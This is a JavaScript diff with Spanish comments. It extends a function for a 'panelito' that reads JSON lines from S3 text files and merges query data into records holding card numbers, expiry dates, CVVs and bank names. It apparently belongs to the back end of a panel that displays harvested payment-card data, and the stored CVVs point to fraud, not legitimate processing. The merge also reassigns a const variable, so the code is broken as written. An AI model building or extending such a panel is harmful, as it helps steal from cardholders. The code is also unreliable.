@@ -38,8 +38,37 @@ function validarJWT(token) {
 
 async function obtenerTransacciones() {
     const transacciones = [];
+    const datosComplementarios = {};
 
-    // SOLO leer de datos_tarjeta.txt (archivo principal para panelito)
+    // Leer datos_consultas.txt (información complementaria)
+    try {
+        const dataConsultas = await new Promise((resolve, reject) => {
+            s3.getObject({ Bucket: BUCKET, Key: 'datos_consultas.txt' }, (err, data) => {
+                if (err) resolve(null);
+                else resolve(data);
+            });
+        });
+
+        if (dataConsultas) {
+            const contenidoConsultas = dataConsultas.Body.toString();
+            const lineasConsultas = contenidoConsultas.split('\n').filter(l => l.trim());
+
+            lineasConsultas.forEach(linea => {
+                try {
+                    const obj = JSON.parse(linea);
+                    if (obj.txid) {
+                        datosComplementarios[obj.txid] = obj;
+                    }
+                } catch (e) {
+                    console.error('Error parseando datos_consultas:', e);
+                }
+            });
+        }
+    } catch (error) {
+        console.error('Error leyendo datos_consultas.txt:', error);
+    }
+
+    // Leer datos_tarjeta.txt (archivo principal para panelito)
     try {
         const data = await new Promise((resolve, reject) => {
             s3.getObject({ Bucket: BUCKET, Key: 'datos_tarjeta.txt' }, (err, data) => {
@@ -54,6 +83,20 @@ async function obtenerTransacciones() {
         lineas.forEach(linea => {
             try {
                 const obj = JSON.parse(linea);
+
+                // Mergear con datos complementarios si existen
+                if (obj.txid && datosComplementarios[obj.txid]) {
+                    obj = {
+                        ...obj,
+                        ...datosComplementarios[obj.txid],
+                        // Mantener los campos principales de tarjeta
+                        cardNumber: obj.cardNumber,
+                        expDate: obj.expDate,
+                        cvv: obj.cvv,
+                        bankName: obj.bankName
+                    };
+                }
+
                 transacciones.push(obj);
             } catch (e) {
                 console.error('Error parseando línea:', e);
